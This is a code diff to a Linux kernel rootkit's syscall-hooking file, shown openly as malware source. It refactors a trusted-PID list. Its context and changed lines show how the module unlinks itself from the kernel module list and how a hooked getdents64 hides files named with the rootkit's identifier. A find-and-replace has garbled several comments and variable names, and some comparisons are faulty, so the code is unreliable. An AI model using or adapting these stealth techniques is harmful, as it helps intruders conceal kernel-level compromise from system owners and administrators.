@@ -10,7 +10,8 @@ struct trusted_pid_node_t{
 	int pid;
 	struct trusted_pid_node_t *next;
 };
-struct trusted_pid_node_t* trusted_pid_head;
+struct trusted_pid_node_t *trusted_pid_head;
+
 
 static int init_trusted_pid_head(void){
 	trusted_pid_head = (struct trusted_pid_node_t *) kmalloc(sizeof(struct trusted_pid_node_t), GFP_KERNEL);
@@ -20,61 +21,77 @@ static int init_trusted_pid_head(void){
 }
 
 static int trust_pid(int pid){
-	int x = 1;
-	struct trusted_pid_node_t *current = trusted_pid_head;
-	if (current->pid==NULL){
-		current->pid = pid;
+	struct trusted_pid_node_t *current_pid;
+	struct trusted_pid_node_t *next_pid;
+	current_pid = trusted_pid_head;
+	if (current_pid->pid==NULL){
+		current_pid->pid = pid;
 		return 0;
 	}
-	while (current->next != NULL) {
-  	current = (struct trusted_pid_node_t *) current->next;
+	else if (current_pid->pid==pid){
+		return 1;
+	}
+	while (current_pid->next != NULL) {
+		if (current_pid->pid==pid){
+			return 1;
+		}
+  	next_pid = current_pid->next;
+		current_pid = next_pid;
   }
-	current->next = (struct trusted_pid_node_t *) kmalloc(sizeof(trusted_pid_node_t), GFP_KERNEL);
-  current->next->pid = pid;
-  current->next->next = NULL;
+	current_pid->next = (struct trusted_pid_node_t *) kmalloc(sizeof(struct trusted_pid_node_t), GFP_KERNEL);
+  current_pid->next->pid = pid;
+  current_pid->next->next = NULL;
 	return 0;
 }
 
 static int untrust_pid(int pid){
-	int x = 1;
-	struct trusted_pid_node_t *current = trusted_pid_head;
-	if (current->pid==pid){
-		current->pid=NULL;
+	struct trusted_pid_node_t *current_pid;
+	struct trusted_pid_node_t *next_pid;
+	current_pid = trusted_pid_head;
+	if (current_pid->pid==pid){
+		current_pid->pid=NULL;
 		return 0;
 	}
-	struct trusted_pid_node_t *previous;
-	while(current!=NULL){
-		if (current->pid==pid){
-			previous->next = current->next;
+	struct trusted_pid_node_t *previous_pid;
+	while(current_pid!=NULL){
+		if (current_pid->pid==pid){
+			previous_pid->next = current_pid->next;
 			return 0;
 		}
-		previous = current;
-		current = (struct trusted_pid_node_t *) current->next;
+		previous_pid = current_pid;
+		next_pid = current_pid->next;
+		current_pid = next_pid;
 	}
-	return 0;
+	return 1;
 }
 
 static bool check_pid_trusted(int pid){
-	int x = 1;
-	struct trusted_pid_node_t *current = trusted_pid_head;
-	while(current!=NULL){
-		if (current->pid==pid){
+	struct trusted_pid_node_t *current_pid;
+	struct trusted_pid_node_t *next_pid;
+	current_pid = trusted_pid_head;
+	while(current_pid!=NULL){
+		if (current_pid->pid==pid){
 			return true;
 		}
-		current = (struct trusted_pid_node_t *) current->next;
+		next_pid = current_pid->next;
+		current_pid = next_pid;
 	}
 	return false;
 }
 
-static int list_trusted_pids(void){
-	int x = 1;
-	struct trusted_pid_node_t *current = trusted_pid_head;
-	char buffer[BUFFER_SIZE];
+static int list_trusted_pids(char *buffer){
+	struct trusted_pid_node_t *current_pid;
+	struct trusted_pid_node_t *next_pid;
+	current_pid = trusted_pid_head;
 	sprintf(buffer, "[hooked_syscalls.c::list_trusted_pids] trusted pids: ");
-	while (current != NULL) {
-		sprintf(buffer, "%s %i", buffer, current->pid);
-  	current = (struct trusted_pid_node_t *) current->next;
+	printk("[rootkit][hooked_syscalls.c::list_trusted_pids] trusted PIDS:\n"); //DEBUG
+	while (current_pid != NULL) {
+		printk("            %i\n", current_pid->pid); //DEBUG
+		sprintf(buffer, "%s %i", buffer, current_pid->pid);
+		next_pid = current_pid->next;
+		current_pid = next_pid;
   }
+	sprintf(buffer, "%s\n", buffer);
 	log_msg(buffer);
 	return 0;
 }
@@ -83,7 +100,7 @@ static int list_trusted_pids(void){
 
 static int hide_rootkit(bool hide){
 	if (hide && !module_hidden){
-		prev_module = THIS_MODULE->list.prev; //sets the location of the previous module so rootkit can re-insert itself
+		prev_module = THIS_MODULE->list.prev; //sets the location of the previous_pid module so rootkit can re-insert itself
 		list_del(&THIS_MODULE->list); //deletes this module from the list
 		log_msg("[hooked_syscalls.c::hide_rootkit] rootkit has been revealed\n");
 		module_hidden^=1;
@@ -165,7 +182,7 @@ static asmlinkage long hooked_execve(const struct pt_regs *regs){
 
 static asmlinkage long hooked_getdents64(const struct pt_regs *regs){
 	char buffer[BUFFER_SIZE];
-	struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL; //buffer to hold kernelspace dirent
+	struct linux_dirent64 *previous_pid_dir, *current_pid_dir, *dirent_ker = NULL; //buffer to hold kernelspace dirent
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si; //gets the userspace dirent structure from regs
 	int ret = sys_getdents64.orig_syscall(regs); //gets the directory listing from  original getdents64
 	unsigned long offset = 0; //offset for loop
@@ -183,23 +200,23 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs){
 
 	while(offset<ret){ //loops through all of the directies
 		//hides all files/directories beginning with rootkit_id
-    current_dir = (void *)dirent_ker + offset; //goes to next directory
+    current_pid_dir = (void *)dirent_ker + offset; //goes to next_pid directory
 
-    if ( strstr(current_dir->d_name, ROOTKIT_ID) != NULL){ //Compare the first bytes of current_dir->d_name to rootkit id
-			sprintf(buffer,"[rootkit] getdents64- hiding %s\n", current_dir->d_name);
+    if ( strstr(current_pid_dir->d_name, ROOTKIT_ID) != NULL){ //Compare the first bytes of current_pid_dir->d_name to rootkit id
+			sprintf(buffer,"[hooked_syscalls.c::hooked_getdents64] hiding %s\n", current_pid_dir->d_name);
 			log_msg(buffer);
 
-			if (current_dir==dirent_ker){ //if special case where fisrt entry needs to be hidden
-				ret -= current_dir->d_reclen; //decrements ret
-				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret); //shifts all structs up in memory
+			if (current_pid_dir==dirent_ker){ //if special case where fisrt entry needs to be hidden
+				ret -= current_pid_dir->d_reclen; //decrements ret
+				memmove(current_pid_dir, (void *)current_pid_dir + current_pid_dir->d_reclen, ret); //shifts all structs up in memory
         continue;
 			}
-			previous_dir->d_reclen += current_dir->d_reclen; //hide entry by incrimenting length of previous entry, "swallowing" the entry
+			previous_pid_dir->d_reclen += current_pid_dir->d_reclen; //hide entry by incrimenting length of previous_pid entry, "swallowing" the entry
     }
 		else{
-			previous_dir = current_dir; //sets previous directory entry
+			previous_pid_dir = current_pid_dir; //sets previous_pid directory entry
 		}
-  	offset += current_dir->d_reclen; //incriment offset by length of current_dir
+  	offset += current_pid_dir->d_reclen; //incriment offset by length of current_pid_dir
 	}
 
   err = copy_to_user(dirent, dirent_ker, ret); //Copy dirent_ker back to userspace from dirent_ker
